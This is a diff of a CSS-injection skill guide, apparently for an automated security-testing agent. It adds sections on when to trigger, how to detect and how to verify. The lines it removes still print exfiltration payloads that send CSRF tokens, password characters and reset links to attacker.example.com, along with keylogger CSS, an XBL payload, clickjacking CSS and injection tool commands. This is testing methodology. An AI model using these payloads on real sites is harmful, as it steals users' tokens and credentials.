@@ -1,4 +1,4 @@
----
+﻿---
 name: css-injection
 description: "CSS injection exploitation for data exfiltration via attribute selectors, keylogger injection, and UI redressing"
 category: specialized
@@ -37,9 +37,6 @@ CSS injection is most powerful when the attacker is authenticated and the target
 
 CSS injection occurs when user-controlled input is inserted into a `<style>` block, a `style` attribute, or an external stylesheet reference without proper sanitization. The fundamental primitive is:
 
-```
-USER_INPUT → rendered as CSS → triggers external resource loads → out-of-band data exfiltration
-```
 
 Common injection points:
 
@@ -49,13 +46,9 @@ Common injection points:
 - URL parameters reflected into stylesheet `href` attributes.
 - Markdown processors that allow raw HTML including `<style>`.
 
-### Minimal Proof of Concept
+### Confirming CSS Injection
 
-```
-background: url(https://attacker.example.com/callback?stolen=data)
-```
-
-If this renders and the server receives a request to `https://attacker.example.com/callback?stolen=data`, CSS injection is confirmed.
+CSS injection is confirmed when injected styles render and the attacker-controlled server receives a callback (e.g., `https://attacker.example.com/callback?stolen=data`).
 
 ---
 
@@ -65,11 +58,6 @@ CSS attribute selectors match HTML attribute values and can trigger resource loa
 
 ### Syntax
 
-```css
-input[value^="a"] { background: url(https://attacker.example.com/exfil?a); }
-input[value^="b"] { background: url(https://attacker.example.com/exfil?b); }
-input[value^="c"] { background: url(https://attacker.example.com/exfil?c); }
-```
 
 ### Attribute Selectors
 
@@ -81,24 +69,6 @@ input[value^="c"] { background: url(https://attacker.example.com/exfil?c); }
 | `[attr\|="val"]` | Exact or starts with `val-` | `[href\|="https://example.com"]` |
 | `[attr~="val"]` | Space-separated word match | `[title~="token"]` |
 
-### Practical Exfiltration Example
-
-Target stores a CSRF token in a hidden input:
-
-```html
-<input type="hidden" name="csrf" value="a8f3k9x2">
-```
-
-Inject CSS to extract position 0:
-
-```css
-input[name="csrf"][value^="0"] { background: url(https://attacker.example.com/exfil?p0=c0); }
-input[name="csrf"][value^="1"] { background: url(https://attacker.example.com/exfil?p0=c1); }
-input[name="csrf"][value^="2"] { background: url(https://attacker.example.com/exfil?p0=c2); }
-/* ... iterate through all possible characters ... */
-input[name="csrf"][value^="a"] { background: url(https://attacker.example.com/exfil?p0=ca); }
-```
-
 ---
 
 ## Character-by-Character Extraction
@@ -107,25 +77,11 @@ Extracting a full value requires iterating over each position. For a token of le
 
 ### Generation Template
 
-```
-POSITION = token length (estimate or iterate until stable)
-CHARSET = [a-z, A-Z, 0-9, - _, . @ / + =] (common token characters)
-
-For each position p (0 to POSITION-1):
-  For each character c in CHARSET:
-    Generate rule:
-    input[value^="KNOWN_PREFIX + c"] { background: url(https://attacker.example.com/exfil?p={p}&c={c}); }
-```
 
 ### Known Prefix Building
 
 Once position 0 is confirmed (callback received for that character), the prefix grows:
 
-```
-Position 0: test "a", "b", ... → callback for "a" → prefix = "a"
-Position 1: test "a0", "a1", ... → callback for "a8" → prefix = "a8"
-Position 2: test "a80", "a81", ... → callback for "a8f" → prefix = "a8f"
-```
 
 ### Optimization
 
@@ -142,31 +98,16 @@ A CSS keylogger captures keystrokes by styling input elements based on `:focus` 
 
 ### Focus-Based Keylogger
 
-```css
-input:focus {
-  background: url(https://attacker.example.com/keylog?field=NAME&focused=true);
-}
-```
 
 ### Attribute-Based Keystroke Inference
 
 When input fields have dynamic attributes that change with each keystroke (e.g., `aria-describedby`, `data-length`, custom attributes), attribute selectors can track changes:
 
-```css
-input[data-length="1"] { background: url(https://attacker.example.com/keylog?len=1); }
-input[data-length="2"] { background: url(https://attacker.example.com/keylog?len=2); }
-input[data-length="3"] { background: url(https://attacker.example.com/keylog?len=3); }
-```
 
 ### Password Field Keylogger (Attribute Dependent)
 
 If the password field reflects typed characters in a `value` attribute (e.g., auto-fill, some JS frameworks):
 
-```css
-input[type="password"][value^="a"] { background: url(https://attacker.example.com/pass?p0=a); }
-input[type="password"][value^="b"] { background: url(https://attacker.example.com/pass?p0=b); }
-/* ... */
-```
 
 ### Practical Limitations
 
@@ -182,43 +123,18 @@ When no direct rendering is visible, CSS injection can still exfiltrate data fro
 
 ### Exfiltrating from `href` Attributes
 
-```css
-a[href^="https://internal.corp/reset-password?token="] {
-  background: url(https://attacker.example.com/exfil?token=ATTR);
-}
-```
 
 ### Exfiltrating from `src` Attributes
 
-```css
-img[src^="/avatar/"] {
-  background: url(https://attacker.example.com/exfil?avatar=ATTR);
-}
-```
 
 ### Exfiltrating from `title` and `alt` Attributes
 
-```css
-div[title^="Welcome"] {
-  background: url(https://attacker.example.com/exfil?title=ATTR);
-}
-```
 
 ### Exfiltrating via `@import`
 
-```css
-@import url("https://attacker.example.com/import?data=SENSITIVE_VALUE");
-```
 
 ### Exfiltrating via `@font-face`
 
-```css
-@font-face {
-  font-family: exfil;
-  src: url("https://attacker.example.com/font?data=SENSITIVE_VALUE");
-}
-body { font-family: exfil; }
-```
 
 This is often more reliable than `background-image` because font loading is less likely to be blocked or cached.
 
@@ -259,17 +175,9 @@ CSS can trigger DOM mutations that enable XSS when combined with certain HTML pa
 
 ### Technique
 
-```css
-@import url("https://attacker.example.com/style.css");
-```
 
 If the imported stylesheet contains:
 
-```css
-* {
-  -moz-binding: url("https://attacker.example.com/xbl.xml#xss");
-}
-```
 
 In older Firefox versions, this could trigger XBL (XML Binding Language) execution.
 
@@ -283,17 +191,6 @@ In older Firefox versions, this could trigger XBL (XML Binding Language) executi
 
 ### UI Redressing (Clickjacking via CSS)
 
-```css
-iframe {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  z-index: 9999;
-  opacity: 0;
-}
-```
 
 Overlay an invisible iframe on top of a legitimate page element to trick users into clicking.
 
@@ -321,25 +218,6 @@ Overlay an invisible iframe on top of a legitimate page element to trick users i
 
 ### Tool Commands
 
-```
-# Inject CSS via HTTP request and verify rendering
-httpRequest --method POST --url "https://target.com/api/theme" --body '{"css": "background: url(https://collaborator.example.com/test)"}'
-
-# Check if callback was received (check Collaborator/DNS logs)
-getCapturedHeaders --filter "collaborator.example.com"
-
-# Render page and inspect computed styles
-evaluateRendered --expression "document.querySelectorAll('input[style]').length"
-
-# Record evidence of successful injection
-recordEvidence --type "css-injection" --detail "Callback received for background-image rule"
-
-# Update graph with finding
-updateGraph --nodeType Finding --data '{"type": "CSS Injection", "severity": "medium", "vector": "style attribute"}'
-
-# Write formal finding
-writeFinding --title "CSS Injection - Data Exfiltration via Attribute Selectors" --severity medium --detail "User-controlled CSS input allows attribute selector exfiltration of HTML attributes"
-```
 
 ### Checklist
 
@@ -369,3 +247,24 @@ writeFinding --title "CSS Injection - Data Exfiltration via Attribute Selectors"
 - CSP bypass success — must be confirmed by receiving callbacks, not by reading CSP headers alone (headers may differ from enforcement).
 - Mutation XSS — requires actual DOM mutation observed via `evaluateRendered`, not theoretical possibility.
 - CSS rendering — must be confirmed by callback, as browsers may strip or ignore malformed CSS.
+
+## Trigger Conditions
+
+Activate when user input lands in a CSS context — a `<style>` block, a `style` attribute, a stylesheet `href`, or `@import`/`@font-face` reference — and the surrounding CSP does not block style resource loads. Especially valuable when JS is blocked but styles load, or when sensitive data sits in reflected HTML attributes (`value`, `href`, `src`, `alt`, `title`, `data-*`) on authenticated pages. Do not trigger when no style input vector exists, when CSP blocks all external/img/font loads, or when the target strips attribute selectors.
+
+## Detection Approach
+
+Confirm injectability with a benign callback rule (`background: url(.../test)`) and verify the callback actually arrives before building exfiltration. Then map which DOM attributes carry sensitive data via `evaluateRendered`/`parseResponse`. Reason about extraction strategy: attribute selectors (`[value^="x"]`) can trigger per-character OOB callbacks; walk each position, narrowing the known prefix on each confirmed callback. If `img-src` blocks `background-image`, pivot to `@font-face`/`@import` (separate CSP directives). For keylogging, only attempt if attributes update per keystroke (rare for standard inputs). Always verify the CSS context is real — input inside a JS string or HTML-entity-encoded context is not injectable.
+
+## Pitfalls
+
+- Inferring the attribute holds sensitive data without inspecting the DOM — guesswork yields false positives.
+- Concluding failure from no callback without first checking CSP (`style-src`/`img-src`/`font-src`) via captured headers.
+- Assuming `background-image` exfil works when `img-src` restricts external domains — use `@font-face`/`@import`.
+- Treating input reflected in a JS string or entity-encoded output as CSS-injectable.
+- Counting on CSS keyloggers for normal `<input>` fields — their `value` is not CSS-observable in real time.
+- Caching or browser prefetch producing phantom callbacks — confirm the character parameter matches expectation.
+
+## Verification & Impact
+
+CONFIRMED when the attacker-controlled listener actually receives callbacks whose query parameters contain the extracted characters/values, corroborated by DOM inspection of the target attribute. SUSPECTED when a benign callback fires but no sensitive data is recovered, or CSP blocks exfil — record as candidate. Document impact by what was exfiltrated (CSRF tokens, emails, session fragments) and the primitive proven (attribute-selector extraction, keylogger, UI redress). Always capture the injected style and received callbacks via `recordEvidence`.
